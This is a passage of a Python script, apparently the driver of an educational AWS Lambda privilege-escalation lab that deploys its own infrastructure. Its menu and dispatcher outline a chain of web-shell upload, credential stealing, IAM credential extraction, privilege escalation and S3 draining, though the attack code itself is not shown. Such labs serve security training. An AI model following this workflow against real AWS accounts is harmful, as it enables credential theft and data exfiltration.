                suggestion="Check bucket data format and metadata structure for analysis"
            )
            
    def _cleanup_local_files(self, stack_name):
        """Clean up local temporary files with comprehensive pattern matching"""
        files_to_clean = [
            f"resources-{stack_name}.json",
            f"deployment_{stack_name}.json",
            "output.txt",
            "enum_outputs*.txt", 
            "aws_credentials*.sh",
            "metadata_raw*.txt",
            "lambda_privesc_results*.json",
            "lambda_escalated_session*.json",  # Added missing pattern
            "s3_extracted_data",
            "s3_enumeration_report*.txt"
        ]
        
        print(f"\n🧹 LOCAL FILE CLEANUP")
        print(f"Cleaning up temporary files for stack: {stack_name}")
        
        cleaned_count = 0
        
        for file_pattern in files_to_clean:
            matched_files = list(Path(".").glob(file_pattern))
            if matched_files:
                print(f"\n  🔍 Pattern: {file_pattern} ({len(matched_files)} file(s))")
                
            for file_path in matched_files:
                try:
                    if file_path.is_file():
                        file_size = file_path.stat().st_size
                        file_path.unlink()
                        print(f"    ✅ Deleted file: {file_path} ({file_size} bytes)")
                    elif file_path.is_dir():
                        import shutil
                        dir_size = sum(f.stat().st_size for f in file_path.rglob('*') if f.is_file())
                        shutil.rmtree(file_path)
                        print(f"    ✅ Deleted directory: {file_path} ({dir_size} bytes)")
                    cleaned_count += 1
                except Exception as e:
                    print(f"    ❌ Could not delete {file_path}: {e}")
                    
        print(f"\n[INFO] Local cleanup summary: {cleaned_count} files/directories processed")
        
        # Verify cleanup completeness
        remaining_issues = self._verify_cleanup_completeness()
        
        # Remove deployment record
        self.safety_manager.remove_deployment_record(stack_name)
        
        return remaining_issues == 0
        
    def _verify_cleanup_completeness(self):
        """Verify all temporary files have been cleaned up"""
        print(f"\n🔍 CLEANUP VERIFICATION")
        print(f"Scanning for remaining temporary files...")
        
        remaining_files = []
        
        # Define patterns for temporary files that should be cleaned up
        temp_patterns = [
            "resources-*.json",
            "deployment_*.json", 
            "lambda_escalated_session_*.json",
            "lambda_privesc_results_*.json",
            "aws_credentials_*.sh",
            "enum_outputs_*.txt",
            "metadata_raw_*.txt",
            "s3_enumeration_report_*.txt"
        ]
        
        for pattern in temp_patterns:
            files = list(Path(".").glob(pattern))
            if files:
                print(f"  ⚠️  Pattern {pattern}: {len(files)} file(s) remain")
                remaining_files.extend(files)
                # Show first few files as examples
                for f in files[:3]:
                    file_age = time.time() - f.stat().st_mtime
                    age_hours = file_age / 3600
                    print(f"    - {f.name} (age: {age_hours:.1f}h)")
                if len(files) > 3:
                    print(f"    ... and {len(files) - 3} more")
                    
        # Check for common build/cache directories
        temp_dirs = [
            "s3_extracted_data",
            "__pycache__",
            ".pytest_cache",
            "build"
        ]
        
        for dir_name in temp_dirs:
            dir_path = Path(dir_name)
            if dir_path.exists() and dir_path.is_dir():
                file_count = len(list(dir_path.rglob('*')))
                if file_count > 0:
                    print(f"  ⚠️  Directory {dir_name}: {file_count} file(s) remain")
                    remaining_files.append(dir_path)
                    
        if remaining_files:
            print(f"\n  ⚠️  CLEANUP INCOMPLETE: {len(remaining_files)} items remain")
            print(f"  💡 These files may be from other sessions or require manual cleanup")
            
            # Offer to clean up remaining files
            try:
                cleanup_remaining = input("\n  🗑️  Clean up remaining temporary files? (y/N): ").strip().lower()
                if cleanup_remaining == 'y':
                    cleaned_additional = 0
                    for item in remaining_files:
                        try:
                            if item.is_file():
                                item.unlink()
                                print(f"    ✅ Deleted: {item.name}")
                            elif item.is_dir():
                                import shutil
                                shutil.rmtree(item)
                                print(f"    ✅ Deleted directory: {item.name}")
                            cleaned_additional += 1
                        except Exception as e:
                            print(f"    ❌ Failed to delete {item}: {e}")
                    print(f"\n  [INFO] Additional cleanup: {cleaned_additional} items removed")
                    return len(remaining_files) - cleaned_additional
                else:
                    print(f"  [INFO] Remaining files preserved as requested")
            except KeyboardInterrupt:
                print(f"\n  [INFO] Additional cleanup skipped")
                
        else:
            print(f"\n  ✅ CLEANUP COMPLETE: No temporary files remain")
            
        return len(remaining_files)
        
    def populate_s3_buckets(self):
        """Populate S3 buckets with synthetic data"""
        print("\n📄 S3 Bucket Population with Synthetic Data")
        print("This will populate lambda-testing-toolkit S3 buckets with realistic test data")
        
        if not self.safety_manager.get_user_confirmation("S3 Bucket Population"):
            return False
            
        # Validate operation
        is_safe, can_proceed = self.safety_manager.validate_operation_safety("populate_s3_buckets")
        if not can_proceed:
            return False
            
        try:
            # Check if we have a deployment
            deployment_data = self._load_latest_deployment()
            if not deployment_data:
                self.logger.error(
                    "No active deployment found. Please deploy infrastructure first (Option 1).",
                    suggestion="Run Option 1 to deploy AWS infrastructure before populating S3 buckets"
                )
                return False
                
            # Import synthetic data generator
            import sys
            sys.path.append('tools')
            from synthetic_data_generator import SyntheticDataGenerator
            
            print("[INFO] Generating synthetic data...")
            generator = SyntheticDataGenerator()
            all_data = generator.generate_all_data()
            
            # Find S3 buckets from deployment
            s3_buckets = self._get_lambdalabs_buckets_from_deployment(deployment_data)
            if not s3_buckets:
                self.logger.error(
                    "No lambda-testing-toolkit S3 buckets found in deployment.",
                    suggestion="Ensure CloudFormation template includes S3 bucket resources for the toolkit"
                )
                return False
                
            print(f"[INFO] Found {len(s3_buckets)} S3 bucket(s) to populate")
            
            # Create S3 client
            s3_client = self.aws_manager.session.client('s3')
            
            # Map data to buckets (aligned with new bucket structure)
            bucket_data_mapping = {
                'data': all_data['data'],      # Primary data bucket
                'logs': all_data['logs'],      # Logs bucket  
                'config': all_data['config']   # Config/secrets bucket
            }
            
            files_uploaded = 0
            
            for bucket_name in s3_buckets:
                print(f"\n[INFO] Processing bucket: {bucket_name}")
                
                # Check if bucket is empty
                try:
                    response = s3_client.list_objects_v2(Bucket=bucket_name, MaxKeys=1)
                    if 'Contents' in response:
                        print(f"[WARNING] Bucket {bucket_name} is not empty, skipping...")
                        continue
                except Exception as e:
                    self.logger.error(
                        f"Cannot access bucket {bucket_name}: {str(e)}",
                        suggestion="Check S3 bucket permissions and ensure bucket exists and is accessible"
                    )
                    continue
                    
                # Determine which data to use based on bucket name
                data_type = None
                for data_category in bucket_data_mapping.keys():
                    if data_category in bucket_name:
                        data_type = data_category
                        break
                        
                if not data_type:
                    # If no specific match, use a mix of data
                    print(f"[INFO] No specific data type for {bucket_name}, using mixed data")
                    files_to_upload = {}
                    # Add a sample from each category
                    for category, data in bucket_data_mapping.items():
                        # Take first file from each category
                        if data:
                            first_file = list(data.items())[0]
                            files_to_upload[f"{category}_{first_file[0]}"] = first_file[1]
                else:
                    files_to_upload = bucket_data_mapping[data_type]
                    print(f"[INFO] Using {data_type} data for {bucket_name}")
                    
                # Upload files to bucket
                for filename, content in files_to_upload.items():
                    try:
                        s3_client.put_object(
                            Bucket=bucket_name,
                            Key=filename,
                            Body=content.encode('utf-8') if isinstance(content, str) else content,
                            ServerSideEncryption='AES256'
                        )
                        files_uploaded += 1
                        print(f"  ✅ Uploaded: {filename}")
                    except Exception as e:
                        print(f"  ❌ Failed to upload {filename}: {str(e)}")
                        
            self.logger.success("S3 bucket population complete!")
            print(f"[INFO] Total files uploaded: {files_uploaded}")
            print(f"[INFO] Buckets populated: {len([b for b in s3_buckets if 'Contents' not in s3_client.list_objects_v2(Bucket=b, MaxKeys=1)])}")
            
            return True
            
        except ImportError:
            self.logger.error(
                "synthetic_data_generator.py not found or invalid",
                suggestion="Ensure synthetic_data_generator.py is in the current directory and properly formatted"
            )
            return False
        except Exception as e:
            self.logger.error(
                f"Failed to populate S3 buckets: {str(e)}",
                suggestion="Check S3 permissions, network connectivity, and bucket accessibility"
            )
            return False
            
    def _get_lambdalabs_buckets_from_deployment(self, deployment_data):
        """Extract lambda-testing-toolkit S3 bucket names from deployment data"""
        buckets = []
        try:
            resources = deployment_data.get("Resources", [])
            for resource in resources:
                if resource.get("ResourceType") == "AWS::S3::Bucket":
                    bucket_name = resource.get("PhysicalResourceId", "")
                    # Look for lambda-testing-toolkit buckets (our toolkit's buckets)
                    if "lambda-testing-toolkit" in bucket_name:
                        buckets.append(bucket_name)
                        print(f"[DEBUG] Found target bucket: {bucket_name}")
            return buckets
        except Exception as e:
            self.logger.error(
                f"Failed to extract bucket names: {str(e)}",
                suggestion="Check deployment data format and CloudFormation resource structure"
            )
            return []
            
    def build_lambda_packages(self):
        """Build Lambda deployment packages"""
        print("\n📦 Lambda Package Builder")
        print("This will create deployment packages for Lambda functions")
        
        if not self.safety_manager.get_user_confirmation("Build Lambda Packages"):
            return False
            
        # Validate operation
        is_safe, can_proceed = self.safety_manager.validate_operation_safety("build_lambda_packages")
        if not can_proceed:
            return False
            
        try:
            print("[INFO] Building Lambda packages...")
            packages = self.lambda_builder.build_all_packages()
            
            if packages:
                print(f"\n[SUCCESS] Built {len(packages)} Lambda packages:")
                for package in packages:
                    package_path = Path(package)
                    size_kb = package_path.stat().st_size / 1024
                    print(f"  ✅ {package_path.name} ({size_kb:.1f} KB)")
            else:
                print("[WARNING] No packages were built")
                
            return True
            
        except Exception as e:
            self.logger.error(
                f"Failed to build Lambda packages: {str(e)}",
                suggestion="Check Lambda builder dependencies and file system permissions"
            )
            return False
            
    def show_main_menu(self):
        """Display the main menu using Rich Panel"""
        from rich.panel import Panel
        from rich.text import Text
        
        menu_text = Text()
        menu_text.append("🚀 AWS Lambda Privilege Escalation Testing Toolkit\n\n", style="bold cyan")
        
        # Menu options
        options = [
            "1️⃣  Deploy AWS Infrastructure",
            "2️⃣  Build Lambda Packages",
            "3️⃣  Populate S3 Buckets", 
            "4️⃣  Upload File to EC2 Web Shell",
            "5️⃣  Execute Credential Stealing Commands",
            "6️⃣  Extract AWS IAM Credentials",
            "7️⃣  Verify Identity using STS",
            "8️⃣  Lambda Privilege Escalation",
            "9️⃣  S3 Exploitation (Post-Escalation)",
            "🔟 Cleanup - Delete AWS Stack & Files",
            "0️⃣  Exit"
        ]
        
        for option in options:
            menu_text.append(f"{option}\n", style="white")
        
        # Show current status
        deployment_files = list(Path(".").glob("resources-*.json"))
        menu_text.append("\n")
        
        if deployment_files:
            menu_text.append(f"📊 Status: {len(deployment_files)} active deployment(s)\n", style="green")
        else:
            menu_text.append("📊 Status: No active deployments\n", style="dim")
            
        if self.safety_manager.is_dry_run():
            menu_text.append("🧪 Mode: DRY-RUN (no AWS operations)", style="yellow")
        else:
            menu_text.append("✅ Mode: LIVE (AWS operations enabled)", style="green")
            
        panel = Panel(
            menu_text,
            title="[bold]LambdaLabs Educational Security Framework[/bold]",
            border_style="cyan",
            padding=(1, 2)
        )
        
        self.logger.console.print(panel)
            
    def run(self):
        """Main application loop"""
        self.logger.info(f"AWS Lambda Testing Toolkit v2.0")
        self.logger.info(f"Account: {self.aws_manager.account_id}")
        self.logger.info(f"Region: {self.aws_manager.current_region}")
        
        while True:
            try:
                self.show_main_menu()
                
                choice = input("\nSelect an option (0-10): ").strip()
                
                if choice == "1":
                    self.deploy_infrastructure()
                elif choice == "2":
                    self.build_lambda_packages()
                elif choice == "3":
                    self.populate_s3_buckets()
                elif choice == "4":
                    self.upload_web_shell()
                elif choice == "5":
                    self.execute_enumeration_commands()
                elif choice == "6":
                    self.extract_aws_credentials()
                elif choice == "7":
                    self.verify_identity_with_sts()
                elif choice == "8":
                    self.validate_lambda_privilege_escalation()
                elif choice == "9":
                    self.enumerate_and_drain_s3()
                elif choice == "10":
                    self.cleanup_deployment()
                elif choice == "0":
                    print("\n[INFO] Exiting AWS Lambda Testing Toolkit")
                    print("[INFO] Remember to clean up any remaining AWS resources!")
                    break
                elif choice.lower() == "dry-run":
                    # Hidden option to toggle dry-run mode
                    if self.safety_manager.is_dry_run():
                        self.safety_manager.disable_dry_run()
                    else:
                        self.safety_manager.enable_dry_run()
                else:
                    print("[ERROR] Invalid selection. Please enter a number between 0 and 10.")
                    
            except KeyboardInterrupt:
                print("\n\n[INFO] Interrupted by user. Exiting...")
                break
            except Exception as e:
                print(f"\n[ERROR] Unexpected error: {str(e)}")
                print("[INFO] Please report this issue if it persists.")


    # IP Management Methods
    def check_ip_access(self):
        """Check current IP access status for deployed infrastructure"""
        print("\n🔍 IP Access Status Check")
        
        try:
            # Load the latest deployment
            deployment_data = self._load_latest_deployment()
            if not deployment_data:
                print("[ERROR] No active deployment found. Please deploy infrastructure first.")
                return False
            
            # Initialize network security manager
            from utils.network_security import NetworkSecurityManager
            net_mgr = NetworkSecurityManager(self.aws_manager.session)
            
            # Check IP access status
            status = net_mgr.check_ip_access_status(deployment_data)
            
            if status['status'] == 'error':
                print(f"❌ Error: {status['message']}")
                return False
            
            # Display results
            current_ip = status['current_ip']
            sg_id = status['security_group_id']
            has_access = status['has_access']
            all_access = status['all_ports_accessible']
            
            print(f"📊 Current IP: {current_ip}")
            print(f"🔒 Security Group: {sg_id}")
            
            print(f"\n🚪 Port Access Status:")
            for port, accessible in has_access.items():
                status_icon = "✅" if accessible else "❌"
                print(f"   Port {port}: {status_icon} {'Accessible' if accessible else 'Blocked'}")
            
            if all_access:
                print(f"\n✅ All ports are accessible from your current IP")
                
                # Test connectivity if possible
                if status.get('connectivity_test') is not None:
                    if status['connectivity_test']:
                        print(f"🌐 Connectivity test: ✅ SSH connection successful")
                    else:
                        print(f"🌐 Connectivity test: ❌ SSH connection failed")
            else:
                print(f"\n❌ Some ports are not accessible from your current IP")
                print(f"💡 Run: python3 lambdalabs.py --update-ip")
            
            return True
            
        except Exception as e:
            print(f"[ERROR] Failed to check IP access: {str(e)}")
            return False
    
    def update_ip_access(self, new_ip=None):
        """Update IP access for existing deployment"""
        print("\n🔄 Updating IP Access")
        
        try:
            # Load the latest deployment
            deployment_data = self._load_latest_deployment()
            if not deployment_data:
                print("[ERROR] No active deployment found. Please deploy infrastructure first.")
                return False
            
            # Initialize network security manager
            from utils.network_security import NetworkSecurityManager
            net_mgr = NetworkSecurityManager(self.aws_manager.session)
            
            # Update IP access
            if net_mgr.update_deployment_ip_access(deployment_data, new_ip):
                print(f"\n✅ IP access updated successfully!")
                print(f"💡 You can now access your deployed resources")
                return True
            else:
                print(f"❌ Failed to update IP access")
                return False
                
        except Exception as e:
            print(f"[ERROR] Failed to update IP access: {str(e)}")
            return False
    
    def add_team_member_ip(self, new_ip):
        """Add IP access for additional team member"""
        print(f"\n👥 Adding Team Member Access: {new_ip}")
        
        try:
            # Load the latest deployment
            deployment_data = self._load_latest_deployment()
            if not deployment_data:
                print("[ERROR] No active deployment found. Please deploy infrastructure first.")
                return False
            
            # Initialize network security manager
            from utils.network_security import NetworkSecurityManager
            net_mgr = NetworkSecurityManager(self.aws_manager.session)
            
            # Add team member access
            if net_mgr.add_team_member_access(deployment_data, new_ip):
                print(f"\n✅ Team member access added successfully!")
                print(f"💡 {new_ip} can now access the deployed resources")
                return True
            else:
                print(f"❌ Failed to add team member access")
                return False
                
        except Exception as e:
            print(f"[ERROR] Failed to add team member access: {str(e)}")
            return False


def parse_arguments():
    """Parse command line arguments (only --update-ip is supported)"""
    parser = argparse.ArgumentParser(
        description="AWS Lambda Testing Toolkit - Dynamic IP Security Management",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 lambdalabs.py                    # Normal interactive mode
  python3 lambdalabs.py --update-ip        # Update IP access (auto-detect)
"""
    )

    parser.add_argument(
        '--update-ip',
        action='store_true',
        help='Update IP access for existing deployment (auto-detects current IP)'
    )

    return parser.parse_args()


def main():
    """Entry point for the application"""
    try:
        # Parse command line arguments
        args = parse_arguments()
        
        # Check if we're in the right directory
        if not Path("payloads/lambda/lambda_function.py").exists():
            print("[WARNING] lambda_function.py not found in payloads/lambda/ directory")
            print("[INFO] Some features may not work correctly")
        
        # Handle IP management command
        if args.update_ip:
            # Initialize toolkit for IP management only (minimal setup)
            try:
                from utils import AWSManager
                aws_manager = AWSManager()
                toolkit = LambdaTestingToolkit()

                # Update IP access (auto-detect current IP)
                toolkit.update_ip_access()
                return

            except Exception as e:
                print(f"[ERROR] IP management failed: {str(e)}")
                sys.exit(1)
        
        # Initialize and run the toolkit normally
        toolkit = LambdaTestingToolkit()
        toolkit.run()
        
    except KeyboardInterrupt:
        print("\n[INFO] Application interrupted by user")
    except Exception as e:
        print(f"[FATAL ERROR] {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
